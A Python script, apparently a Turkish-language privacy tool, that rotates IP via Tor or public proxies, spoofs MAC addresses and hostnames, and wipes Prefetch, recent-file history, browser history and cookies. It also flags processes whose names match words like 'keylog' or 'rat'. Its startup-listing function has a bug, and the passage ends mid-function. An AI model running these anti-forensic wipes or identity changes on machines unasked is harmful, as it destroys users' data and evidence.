import os, sys, time, socket, platform, subprocess
import threading, random, string, shutil, glob, struct, hashlib, secrets
import io

# ── Platform tespiti ─────────────────────────────
IS_WINDOWS = platform.system() == "Windows"

# ctypes — Windows'ta var, Linux'ta da var ama bazı şeyler farklı
try:
    import ctypes
except ImportError:
    ctypes = None

# winreg — sadece Windows
try:
    import winreg
except ImportError:
    winreg = None

# UTF-8 çıktı — sadece hata durumunda replace, QR blokları bozulmasın
if sys.stdout.encoding and sys.stdout.encoding.lower() not in ('utf-8','utf-8-sig'):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
    import requests

try:
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# ── ANSI + clear ────────────────────────────────
if IS_WINDOWS:
    os.system("color")  # Windows'ta ANSI aktif et

def clear():
    os.system("cls" if IS_WINDOWS else "clear")

R      = "\033[0m";  BOLD = "\033[1m";  DIM = "\033[2m"
CYAN   = "\033[96m"; DCYAN= "\033[36m"; BLUE= "\033[94m"
GREEN  = "\033[92m"; DGREEN="\033[32m"
RED    = "\033[91m"; YELLOW="\033[93m"
MAG    = "\033[95m"; DMAG = "\033[35m"
WHITE  = "\033[97m"; GRAY = "\033[90m"

TOR_PROXIES = {'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
def success(m): print(f"\n  {GREEN}[+]{R} {WHITE}{m}{R}")
def error(m):   print(f"\n  {RED}[-]{R} {m}")
def warn(m):    print(f"\n  {YELLOW}[!]{R} {m}")
def info(m):    print(f"  {DGREEN}[i]{R} {GRAY}{m}{R}")
def lv(l,v,lc=GREEN,vc=WHITE,p=24): print(f"  {lc}{l:<{p}}{R} {vc}{v}{R}")
def divider(c=DGREEN,ch="─",w=66): print(f"  {c}{ch*w}{R}")
def thick(): print(f"  {GREEN}{'═'*66}{R}")
def pause(): input(f"\n  {GRAY}[ Enter'a bas... ]{R}  ")
def confirm(q):
    print(f"\n  {YELLOW}{q} {GREEN}[E/H]{R}", end="  ")
    return input().strip().lower() == "e"

def spin(msg, dur=1.5):
    frames=["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    end=time.time()+dur; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {GREEN}{frames[i%len(frames)]}{R} {msg} ")
        sys.stdout.flush(); time.sleep(0.08); i+=1
    sys.stdout.write(f"\r  {GREEN}✓{R} {msg}{'  ':10}\n")

def pbar(label,total=25,color=CYAN):
    print(f"  {GRAY}{label}{R}")
    for i in range(total):
        pct=int((i+1)/total*100)
        sys.stdout.write(f"\r  {color}[{'█'*(i+1):<{total}}]{R} {WHITE}{pct}%{R}  ")
        sys.stdout.flush(); time.sleep(0.025)
    print()

def typewrite(text,delay=0.02,color=""):
    for ch in text:
        sys.stdout.write(color+ch+R); sys.stdout.flush(); time.sleep(delay)
    print()

BANNER=[
    r" ▄▄▄▄▄▄  ▄▄▄▄▄  ▄▄     ▄▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄  ▄▄",
    r" █       █   █  █      █   █  █   █    █    █      ███  ██",
    r" █████   █   █  █      █   █  █████    █    █████  █ ████ ",
    r"     █   █   █  █      █   █  █   █    █    █      █  ██  ",
    r" █████   █████  █████  █████  █   █    █    ███████ █  ██ ",
    r"  ░ ░    ░ ░ ░  ░ ░    ░ ░    ░   ░    ░    ░ ░ ░   ░  ░  ",
    r"  ░      ░   ░  ░  ░   ░ ░    ░        ░    ░   ░   ░  ░  ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
    r"                                                           ",
]
BCOLS=[GREEN,GREEN,GREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN,DGREEN]

FIRE=[
    "..............                    ",
    "            ..,;:ccc,.            ",
    "          ......''';lxO.          ",
    ".....''''..........,:ld;          ",
    "           .';;;:::;,,.x,         ",
    "      ..'''.            0Xxoc:,.  ...",
    "  ....                ,ONkc;,;cokOdc',.",
    " .                   OMo           ':ddo.",
    "                    dMc               :OO;",
    "                    0M.                 .:o.",
    "                    ;Wd                    ",
    "                     ;XO,                  ",
    "                       ,d0Odlc;,..         ",
    "                           ..',;:cdOOd::,. ",
    "                                    .:d;.':;.",
    "                                       'd,  .'",
    "                                         ;l   ..",
    "                                          .o  ",
    "                                            c ",
    "                                            .'",
    "                                             .",
]
EYE_COLOR = GREEN

def animated_banner():
    clear()
    banner_w = 62
    all_lines = max(len(BANNER), len(FIRE))
    for i in range(all_lines):
        b_line = BANNER[i] if i < len(BANNER) else ""
        f_line = FIRE[i]   if i < len(FIRE)   else ""
        b_col  = BCOLS[i]  if i < len(BCOLS)  else DGREEN
        pad    = max(0, banner_w - len(b_line))
        print(f"{BOLD}{b_col}{b_line}{' '*pad}  {EYE_COLOR}{f_line}{R}")
        time.sleep(0.03)
    print(f"\n  {DIM}{WHITE}{'·'*24}  Gizlilik & Kimlik Koruma Araci  {'·'*24}{R}")
    thick()

def banner(title="",sub=""):
    clear()
    banner_w = 62
    all_lines = max(len(BANNER), len(FIRE))
    for i in range(all_lines):
        b_line = BANNER[i] if i < len(BANNER) else ""
        f_line = FIRE[i]   if i < len(FIRE)   else ""
        b_col  = BCOLS[i]  if i < len(BCOLS)  else DGREEN
        pad    = max(0, banner_w - len(b_line))
        print(f"{BOLD}{b_col}{b_line}{' '*pad}  {EYE_COLOR}{f_line}{R}")
    print(f"\n  {DIM}{WHITE}{'·'*24}  Gizlilik & Kimlik Koruma Araci  {'·'*24}{R}")
    thick()
    if title:
        print(f"\n  {BOLD}{WHITE}  ▸  {title}{R}")
        if sub: print(f"  {GRAY}     {sub}{R}")
        divider()

# ════════════════════════════════════════════════
#  1. DURUM
# ════════════════════════════════════════════════
def get_ip(tor=False):
    try:
        r=requests.get("https://api.ipify.org?format=json",
                       proxies=TOR_PROXIES if tor else None,timeout=10)
        return r.json().get("ip","?")
    except: return "Baglanilamadi"

def get_loc(ip):
    try:
        d=requests.get(f"https://ipapi.co/{ip}/json/",timeout=10).json()
        return d.get("city","?"),d.get("region","?"),d.get("country_name","?"),d.get("org","?")
    except: return "?","?","?","?"

def menu_durum():
    banner("MEVCUT DURUM","IP · Konum · Sistem")
    spin("Bilgiler aliniyor",1.5)
    ip=get_ip(); city,reg,ctr,isp=get_loc(ip)
    print(); thick()
    lv("  Gercek IP",ip,lc=CYAN,vc=YELLOW)
    lv("  Sehir / Bolge",f"{city}, {reg}",lc=DCYAN)
    lv("  Ulke",ctr,lc=DCYAN)
    lv("  ISP",isp,lc=DCYAN,vc=GRAY)
    divider()
    lv("  Bilgisayar Adi",socket.gethostname(),lc=MAG,vc=GREEN)
    lv("  Isletim S.",platform.system()+" "+platform.release(),lc=MAG)
    lv("  Python",sys.version.split()[0],lc=MAG)
    divider()
    lv("  Tor","Hazir ✓" if TOR_AVAILABLE else "Yuklu degil → pip install stem",
       lc=GREEN if TOR_AVAILABLE else RED, vc=GREEN if TOR_AVAILABLE else RED)
    lv("  Sifreleme","Hazir ✓" if CRYPTO_AVAILABLE else "Yuklu degil → pip install cryptography",
       lc=GREEN if CRYPTO_AVAILABLE else RED, vc=GREEN if CRYPTO_AVAILABLE else RED)
    thick(); pause()

# ════════════════════════════════════════════════
#  2. IP DEĞİŞTİR
# ════════════════════════════════════════════════
PROXY_APIS=[
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]
def fetch_proxies():
    pl=[]
    for url in PROXY_APIS:
        try:
            r=requests.get(url,timeout=8)
            if r.status_code==200:
                for ln in r.text.strip().splitlines():
                    ln=ln.strip()
                    if ":" in ln and len(ln)<30: pl.append(ln)
            if len(pl)>=50: break
        except: continue
    return list(set(pl))

def test_proxy(p):
    try:
        px={"http":f"http://{p}","https":f"http://{p}"}
        r=requests.get("https://api.ipify.org?format=json",proxies=px,timeout=5)
        ip=r.json().get("ip","")
        return (True,ip) if ip else (False,"")
    except: return False,""

def change_tor_ip():
    if not TOR_AVAILABLE: return False,"stem yuklu degil"
    try:
        with Controller.from_port(port=9051) as c:
            try: c.authenticate()
            except: c.authenticate(password="")
            c.signal(Signal.NEWNYM)
        time.sleep(3); return True,"OK"
    except Exception as e: return False,str(e)

def find_torrc():
    user=os.path.expanduser("~")
    desk=os.path.join(user,"Desktop")
    candidates=[
        os.path.expandvars(r"%APPDATA%\tor\torrc"),
        os.path.join(desk,"Uygulamalar","Tor Browser","Browser","TorBrowser","Data","Tor","torrc"),
        os.path.join(desk,"Tor Browser","Browser","TorBrowser","Data","Tor","torrc"),
        os.path.join(user,"Downloads","Tor Browser","Browser","TorBrowser","Data","Tor","torrc"),
        r"C:\Program Files\Tor Browser\Browser\TorBrowser\Data\Tor\torrc",
    ]
    for p in candidates:
        if os.path.isfile(p): return p
    for root in [desk,user]:
        for dp,dirs,files in os.walk(root):
            dirs[:]=[d for d in dirs if d not in ("Windows","System32","node_modules",".git","__pycache__")]
            if dp.replace(root,"").count(os.sep)>7: dirs.clear(); continue
            if "torrc" in files:
                f=os.path.join(dp,"torrc")
                if any(x in f for x in ("TorBrowser","Tor Browser")): return f
    return None

def fix_torrc(path):
    try:
        txt=open(path,encoding="utf-8").read()
        changed=False
        if "ControlPort 9051" not in txt: txt+="\nControlPort 9051"; changed=True
        if "CookieAuthentication 1" not in txt: txt+="\nCookieAuthentication 1"; changed=True
        if changed: open(path,"w",encoding="utf-8").write(txt)
        return True,path
    except Exception as e: return False,str(e)

def menu_ip():
    banner("IP DEGISTIR","Tor  |  Proxy")
    print(f"  {GREEN}[1]{R}  {WHITE}Tor{R}      {GRAY}Daha gizli, Tor Browser gerekli{R}")
    print(f"  {GREEN}[2]{R}  {WHITE}Proxy{R}    {GRAY}Hizli, kurulum gerektirmez{R}")
    print(f"  {RED}[0]{R}  Geri")
    print(f"\n  {GREEN}Secim:{R}  ",end=""); s=input().strip()

    if s=="0": return
    elif s=="1":
        if not TOR_AVAILABLE:
            error("stem yuklu degil."); warn("pip install stem PySocks"); pause(); return
        warn("Tor Browser acik olmali!")
        if not confirm("Devam?"): return
        spin("Tor'a baglaniliyor",1.0)
        ok,msg=change_tor_ip()
        if ok:
            spin("Yeni IP aliniyor",1.0)
            tip=get_ip(tor=True); city,reg,ctr,isp=get_loc(tip)
            thick(); lv("  Yeni Tor IP",tip,lc=GREEN,vc=GREEN)
            lv("  Konum",f"{city}, {reg}, {ctr}",lc=DCYAN)
            lv("  ISP",isp,lc=DCYAN,vc=GRAY); thick()
            success("IP degistirildi!")
        else:
            error(msg)
            if "10061" in msg or "refused" in msg.lower() or "reddetti" in msg:
                warn("ControlPort kapali. Otomatik duzeltilsin mi?")
                if confirm("torrc duzeltilsin mi?"):
                    spin("torrc aranip duzeltiliyor",1.2)
                    torrc=find_torrc()
                    if torrc:
                        ok2,res=fix_torrc(torrc)
                        if ok2:
                            success(f"Duzeltildi: {res}")
                            print(f"  {GREEN}  → Tor Browser'i kapat, tekrar ac, sonra tekrar dene.{R}")
                        else: error(res)
                    else:
                        error("torrc bulunamadi.")
                        print(f"  {GRAY}  Tor Browser'i yeniden yukle veya yolu elle gir.{R}")
    elif s=="2":
        spin("Proxy listesi indiriliyor",1.5)
        pl=fetch_proxies()
        if not pl: error("Proxy listesi alinamadi."); pause(); return
        info(f"{len(pl)} proxy bulundu. Test ediliyor...")
        random.shuffle(pl); found_ip=found_px=None
        for i,px in enumerate(pl[:40]):
            sys.stdout.write(f"\r  {GREEN}[~]{R} {i+1}/40  {GRAY}{px:<22}{R}  ")
            sys.stdout.flush()
            ok,ip=test_proxy(px)
            if ok:
                found_px=px; found_ip=ip
                sys.stdout.write(f"\r  {GREEN}[+]{R} {GREEN}{px:<22}{R}  IP: {YELLOW}{ip}{R}{'':10}\n")
                break
        if found_ip:
            city,reg,ctr,isp=get_loc(found_ip)
            thick(); lv("  Proxy",found_px,lc=CYAN)
            lv("  IP",found_ip,lc=GREEN,vc=GREEN)
            lv("  Konum",f"{city}, {reg}, {ctr}",lc=DCYAN)
            lv("  ISP",isp,lc=DCYAN,vc=GRAY); thick()
            success("Proxy bulundu!")
            warn("Proxy'yi tarayici ayarlarindan manuel girmek gerekir.")
        else: error("Calisir proxy bulunamadi. Tekrar dene.")
    pause()

# ════════════════════════════════════════════════
#  3. BİLGİSAYAR ADI
# ════════════════════════════════════════════════
def menu_hostname():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    lv("  Mevcut Ad",socket.gethostname(),lc=CYAN,vc=YELLOW); divider()
    print(f"\n  {GREEN}Yeni ad:{R}  ",end=""); new=input().strip()
    if not new: error("Bos olamaz."); pause(); return
    if not all(c.isalnum() or c=="-" for c in new):
        error("Sadece harf, rakam ve '-' kullanabilirsin."); pause(); return
    warn(f"'{socket.gethostname()}'  →  '{new}'")
    warn("Yonetici yetkisi ve yeniden baslatma gerekir.")
    if not confirm("Onayla?"): warn("Iptal."); pause(); return
    spin("Degistiriliyor",1.0)
    try:
        res=subprocess.run(["powershell","-Command",
            f'Rename-Computer -NewName "{new}" -Force'],
            capture_output=True,text=True)
        if res.returncode==0:
            success("Bilgisayar adi degistirildi!")
            if confirm("Simdi yeniden baslatilsin mi?"):
                subprocess.run(["shutdown","/r","/t","5","/c","Soldaten: Hostname degisti."])
                print(f"  {GREEN}5 saniye icinde yeniden baslatiliyor...{R}")
            else: warn("Bir sonraki baslatmada aktif olacak.")
        else: error(res.stderr.strip() or "Yonetici yetkisi gerekli.")
    except Exception as e: error(str(e))
    pause()

# ════════════════════════════════════════════════
#  4. MAC ADRESİ DEĞİŞTİR
# ════════════════════════════════════════════════
def get_adapters():
    if not IS_WINDOWS: return []
    try:
        res=subprocess.run(["powershell","-Command",
            "Get-NetAdapter | Select-Object Name,MacAddress,Status | ConvertTo-Csv -NoTypeInformation"],
            capture_output=True,text=True)
        adapters=[]
        for ln in res.stdout.strip().splitlines()[1:]:
            parts=[x.strip('"') for x in ln.split(",")]
            if len(parts)>=3: adapters.append(parts)
        return adapters
    except: return []

def random_mac():
    mac=[random.randint(0,255) for _ in range(6)]
    mac[0]=(mac[0]&0xFE)|0x02  # locally administered, unicast
    return "-".join(f"{b:02X}" for b in mac)

def change_mac(adapter_name,new_mac):
    try:
        mac_clean=new_mac.replace("-","").replace(":","")
        key_path=r"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
        reg=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,key_path)
        i=0
        while True:
            try:
                sub=winreg.EnumKey(reg,i)
                subkey=winreg.OpenKey(reg,sub,0,winreg.KEY_READ|winreg.KEY_WRITE)
                try:
                    name=winreg.QueryValueEx(subkey,"DriverDesc")[0]
                    if adapter_name.lower() in name.lower():
                        winreg.SetValueEx(subkey,"NetworkAddress",0,winreg.REG_SZ,mac_clean)
                        winreg.CloseKey(subkey)
                        # Adaptoru yeniden baslat
                        subprocess.run(["powershell","-Command",
                            f'Disable-NetAdapter -Name "{adapter_name}" -Confirm:$false'],
                            capture_output=True)
                        time.sleep(2)
                        subprocess.run(["powershell","-Command",
                            f'Enable-NetAdapter -Name "{adapter_name}" -Confirm:$false'],
                            capture_output=True)
                        return True,"OK"
                except: pass
                winreg.CloseKey(subkey); i+=1
            except OSError: break
        return False,"Adaptör registry'de bulunamadi."
    except Exception as e: return False,str(e)

def menu_mac():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    adapters=get_adapters()
    if not adapters: error("Ag adaptoru bulunamadi."); pause(); return
    print(f"  {BOLD}{WHITE}Mevcut Adaptörler:{R}\n")
    for i,(name,mac,status) in enumerate(adapters,1):
        sc=GREEN if "Up" in status else GRAY
        print(f"  {GREEN}[{i}]{R}  {WHITE}{name:<30}{R}  {sc}{mac:<20}{R}  {DIM}{status}{R}")
    print(f"\n  {GREEN}Secim (numara):{R}  ",end=""); s=input().strip()
    if not s.isdigit() or not (1<=int(s)<=len(adapters)):
        error("Gecersiz secim."); pause(); return
    name,old_mac,_=adapters[int(s)-1]
    new_mac=random_mac()
    warn(f"'{name}'  MAC:  {old_mac}  →  {new_mac}")
    if not confirm("Devam?"): warn("Iptal."); pause(); return
    spin("MAC degistiriliyor",1.5)
    ok,msg=change_mac(name,new_mac)
    if ok:
        success(f"MAC degistirildi: {new_mac}")
        info("Asil MAC yeniden baslatmada geri gelebilir (donanim bagli).")
    else: error(msg)
    pause()

# ════════════════════════════════════════════════
#  5. DNS DEĞİŞTİR
# ════════════════════════════════════════════════
DNS_PROVIDERS={
    "1": ("Cloudflare (Hizli & Gizli)", "1.1.1.1","1.0.0.1"),
    "2": ("Google",                     "8.8.8.8","8.8.4.4"),
    "3": ("Quad9 (Guvenlik odakli)",    "9.9.9.9","149.112.112.112"),
    "4": ("OpenDNS",                    "208.67.222.222","208.67.220.220"),
}

def menu_dns():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    adapters=get_adapters()
    active=[a for a in adapters if "Up" in a[2]]
    if not active: error("Aktif ag adaptoru bulunamadi."); pause(); return
    adapter=active[0][0]
    info(f"Aktif adaptör: {adapter}")
    print()
    for k,(name,p,s) in DNS_PROVIDERS.items():
        print(f"  {GREEN}[{k}]{R}  {WHITE}{name:<30}{R}  {GRAY}{p} / {s}{R}")
    print(f"  {RED}[0]{R}  Geri")
    print(f"\n  {GREEN}Secim:{R}  ",end=""); s=input().strip()
    if s=="0": return
    if s not in DNS_PROVIDERS: error("Gecersiz secim."); pause(); return
    name,pri,sec=DNS_PROVIDERS[s]
    spin(f"DNS degistiriliyor: {name}",1.2)
    try:
        subprocess.run(["powershell","-Command",
            f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ServerAddresses ("{pri}","{sec}")'],
            capture_output=True,text=True,check=True)
        subprocess.run(["ipconfig","/flushdns"],capture_output=True)
        thick(); lv("  Adaptör",adapter,lc=CYAN)
        lv("  Birincil DNS",pri,lc=GREEN,vc=GREEN)
        lv("  Ikincil DNS",sec,lc=GREEN,vc=GREEN)
        lv("  Saglayici",name,lc=DCYAN); thick()
        success("DNS degistirildi ve cache temizlendi!")
    except Exception as e: error(str(e))
    pause()

# ════════════════════════════════════════════════
#  6. AKTİF BAĞLANTILAR
# ════════════════════════════════════════════════
def menu_connections():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    spin("Baglantilar aliniyor",1.0)
    try:
        res=subprocess.run(["powershell","-Command",
            "Get-NetTCPConnection -State Established | "
            "Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,"
            "@{n='Process';e={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} | "
            "Sort-Object Process | ConvertTo-Csv -NoTypeInformation"],
            capture_output=True,text=True,timeout=20)
        lines=res.stdout.strip().splitlines()
        if len(lines)<2: error("Baglanti bulunamadi."); pause(); return
        print(); thick()
        print(f"  {BOLD}{GREEN}{'PROCESS':<20}{'YEREL PORT':<14}{'UZAK ADRES':<22}{'UZAK PORT'}{R}")
        divider()
        for ln in lines[1:]:
            p=[x.strip('"') for x in ln.split(",")]
            if len(p)<5: continue
            proc=p[4] if p[4] else "?"
            col=YELLOW if proc in ("chrome","msedge","firefox","brave") else WHITE
            print(f"  {col}{proc:<20}{R}{GRAY}{p[1]:<14}{R}{DGREEN}{p[2]:<22}{R}{GRAY}{p[3]}{R}")
        thick()
        success(f"{len(lines)-1} aktif baglanti listelendi.")
    except Exception as e: error(str(e))
    pause()

# ════════════════════════════════════════════════
#  7. TEMP & İZ TEMİZLE
# ════════════════════════════════════════════════
def clean_dir(path):
    removed=0
    if not os.path.isdir(path): return 0
    for item in os.listdir(path):
        fp=os.path.join(path,item)
        try:
            if os.path.isfile(fp) or os.path.islink(fp): os.remove(fp); removed+=1
            elif os.path.isdir(fp): shutil.rmtree(fp,ignore_errors=True); removed+=1
        except: pass
    return removed

def menu_clean_temp():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    warn("Temp, Recent, Prefetch dosyalari silinecek.")
    if not confirm("Devam?"): return
    pbar("Temizleniyor...",20,RED)
    targets={
        "Windows Temp":     os.environ.get("TEMP",""),
        "System Temp":      r"C:\Windows\Temp",
        "Prefetch":         r"C:\Windows\Prefetch",
        "Recent Files":     os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent"),
        "Thumbs Cache":     os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\Explorer"),
        "Run History":      os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations"),
    }
    total=0
    thick()
    for name,path in targets.items():
        n=clean_dir(path)
        col=GREEN if n>0 else GRAY
        print(f"  {col}{'✓' if n>0 else '·'}{R}  {WHITE}{name:<22}{R}  {col}{n} dosya{R}")
        total+=n
    # DNS cache
    subprocess.run(["ipconfig","/flushdns"],capture_output=True)
    print(f"  {GREEN}✓{R}  {WHITE}{'DNS Cache':<22}{R}  {GREEN}Temizlendi{R}")
    thick()
    success(f"Toplam {total} dosya/klasor silindi.")
    pause()

# ════════════════════════════════════════════════
#  8. TARAYICI GEÇMİŞİ
# ════════════════════════════════════════════════
BROWSER_PATHS={
    "Chrome": [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"),
    ],
    "Edge": [
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cache"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies"),
    ],
    "Firefox": [os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")],
    "Brave": [
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\History"),
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cache"),
    ],
    "Opera": [
        os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\History"),
        os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Cache"),
    ],
}
BROWSER_PROCS={"Chrome":"chrome","Edge":"msedge","Firefox":"firefox",
               "Brave":"brave","Opera":"opera"}

def kill_browser(proc):
    subprocess.run(["taskkill","/F","/IM",f"{proc}.exe"],capture_output=True)

def menu_clean_browser():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    if confirm("Tarayicilar otomatik kapatilsin mi? (Onerilir)"):
        spin("Tarayicilar kapatiliyor",1.0)
        for proc in BROWSER_PROCS.values(): kill_browser(proc)
        time.sleep(1)
    pbar("Gecmis ve cache siliniyor...",25,CYAN)
    cleaned=[]; failed=[]
    for br,paths in BROWSER_PATHS.items():
        for path in paths:
            if os.path.isfile(path):
                try: os.remove(path); cleaned.append(f"{br}: {os.path.basename(path)}")
                except Exception as e: failed.append(f"{br}: {os.path.basename(path)} ({e})")
            elif os.path.isdir(path):
                try: shutil.rmtree(path,ignore_errors=True); cleaned.append(f"{br}: {os.path.basename(path)}")
                except Exception as e: failed.append(f"{br}: {os.path.basename(path)} ({e})")
    thick()
    if cleaned:
        print(f"  {GREEN}{BOLD}Temizlenenler:{R}")
        for item in cleaned: print(f"  {GREEN}  ✓{R}  {item}")
    if failed:
        print(f"\n  {RED}{BOLD}Silinemeyenler:{R}")
        for item in failed: print(f"  {RED}  ✗{R}  {item}")
        warn("Kapatilmayan tarayicilar silinemez.")
    thick()
    success(f"{len(cleaned)} dosya/klasor temizlendi.")
    pause()

# ════════════════════════════════════════════════
#  9. PANO & RECENT TEMİZLE
# ════════════════════════════════════════════════
def menu_clipboard():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    spin("Temizleniyor",1.0)
    # Clipboard
    try:
        subprocess.run(["powershell","-Command","Set-Clipboard -Value $null"],capture_output=True)
        cb_ok=True
    except: cb_ok=False
    # Recent
    recent=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent")
    n=clean_dir(recent)
    # Jump lists
    jl=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations")
    jl2=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent\CustomDestinations")
    n+=clean_dir(jl)+clean_dir(jl2)
    thick()
    print(f"  {GREEN}✓{R}  Pano (Clipboard)  {GREEN}Temizlendi{R}" if cb_ok
          else f"  {RED}✗{R}  Pano temizlenemedi")
    print(f"  {GREEN}✓{R}  Son Dosyalar       {GREEN}{n} kayit silindi{R}")
    thick()
    success("Pano ve gecmis temizlendi.")
    pause()

# ════════════════════════════════════════════════
#  10. ÇALIŞAN PROCESSLER
# ════════════════════════════════════════════════
def menu_processes():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    spin("Processler aliniyor",1.0)
    try:
        res=subprocess.run(["powershell","-Command",
            "Get-Process | Select-Object Name,Id,CPU,WorkingSet | "
            "Sort-Object CPU -Descending | Select-Object -First 30 | "
            "ConvertTo-Csv -NoTypeInformation"],
            capture_output=True,text=True,timeout=15)
        lines=res.stdout.strip().splitlines()
        print(); thick()
        print(f"  {BOLD}{GREEN}{'AD':<28}{'PID':<10}{'CPU':<10}{'RAM (MB)'}{R}")
        divider()
        suspicious=["keylog","rat","miner","spy","inject","hook","dump"]
        for ln in lines[1:31]:
            p=[x.strip('"') for x in ln.split(",")]
            if len(p)<4: continue
            name=p[0]; pid=p[1]
            cpu=p[2][:6] if p[2] else "0"
            try: ram=str(round(int(p[3])/1024/1024,1))
            except: ram="?"
            col=RED if any(s in name.lower() for s in suspicious) else WHITE
            print(f"  {col}{name:<28}{R}{GRAY}{pid:<10}{R}{YELLOW}{cpu:<10}{R}{DGREEN}{ram}{R}")
        thick()
        success("En yuksek CPU kullananlar listelendi.")
    except Exception as e: error(str(e))
    pause()

# ════════════════════════════════════════════════
#  11. STARTUP PROGRAMLARI
# ════════════════════════════════════════════════
def get_startup():
    if not IS_WINDOWS: return []
    keys=[
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ]
    for hive,path in keys:
        try:
            key=winreg.OpenKey(hive,path)
            i=0
            while True:
                try:
                    name,val,_=winreg.EnumValue(key,i)
                    items.append((name,val,hive,path)); i+=1
                except OSError: break
            winreg.CloseKey(key)
        except: pass
    return items

def menu_startup():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    spin("Listesi aliniyor",0.8)
    items=get_startup()
    if not items: warn("Startup kaydi bulunamadi."); pause(); return
    print(); thick()
    print(f"  {BOLD}{GREEN}{'#':<5}{'PROGRAM':<28}{'YOL'}{R}")
    divider()
    for i,(name,val,_,_) in enumerate(items,1):
        short_val=val[:45]+"..." if len(val)>45 else val
        print(f"  {GREEN}{i:<5}{R}{WHITE}{name:<28}{R}{GRAY}{short_val}{R}")
    thick()
    if confirm("Bir programi startup'tan kaldir?"):
        print(f"  {GREEN}Numara:{R}  ",end=""); s=input().strip()
        if s.isdigit() and 1<=int(s)<=len(items):
            name,_,hive,path=items[int(s)-1]
            try:
                key=winreg.OpenKey(hive,path,0,winreg.KEY_WRITE)
                winreg.DeleteValue(key,name)
                winreg.CloseKey(key)
                success(f"'{name}' startup'tan kaldirildi.")
            except Exception as e: error(str(e))
        else: error("Gecersiz secim.")
    pause()

# ════════════════════════════════════════════════
#  12. DOSYA ŞİFRELE / ÇÖZ
# ════════════════════════════════════════════════
def menu_encrypt():
    banner("DOSYA SIFRELE / COZ","AES-128 ile guclu sifreleme")
    if not CRYPTO_AVAILABLE:
        error("cryptography yuklu degil.")
        warn("Kurmak icin:  pip install cryptography"); pause(); return
    print(f"  {GREEN}[1]{R}  {WHITE}Dosya Sifrele{R}   {GRAY}Seçilen dosyayi şifrele{R}")
    print(f"  {GREEN}[2]{R}  {WHITE}Dosya Coz{R}       {GRAY}Sifreli dosyayi coz{R}")
    print(f"  {RED}[0]{R}  Geri")
    print(f"\n  {GREEN}Secim:{R}  ",end=""); s=input().strip()
    if s=="0": return

    print(f"\n  {GREEN}Dosya yolu:{R}  ",end=""); path=input().strip().strip('"')
    if not os.path.isfile(path): error("Dosya bulunamadi."); pause(); return

    import getpass
    print(f"  {GREEN}Sifre:{R}  ",end=""); pw=getpass.getpass("")
    if not pw: error("Sifre bos olamaz."); pause(); return

    key=hashlib.sha256(pw.encode()).digest()
    fkey=Fernet(Fernet.generate_key().__class__(
        __import__("base64").urlsafe_b64encode(key)))

    if s=="1":
        spin("Sifreleniyor",1.0)
        try:
            data=open(path,"rb").read()
